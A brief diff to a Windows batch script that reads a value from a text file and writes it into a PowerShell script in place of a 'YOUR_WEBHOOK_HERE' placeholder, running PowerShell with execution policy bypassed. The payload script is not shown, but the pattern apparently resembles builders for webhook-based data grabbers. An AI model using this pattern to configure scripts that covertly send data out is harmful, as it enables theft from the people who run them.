@@ -9,7 +9,7 @@ set "file=hey.txt"
 set "variable="
 
 for /f "usebackq delims=" %%A in ("%file%") do (set "variable=%%A")
-REM echo $webhook = "YOUR_WEBHOOK_HERE" >> powershell123.ps1
+
 set "ps=testpower.ps1"
 powershell -ExecutionPolicy Bypass -NoProfile -NonInteractive -NoLogo -Command "(Get-Content %ps%) -replace 'YOUR_WEBHOOK_HERE', '%variable%' | Set-Content %ps%"
 exit
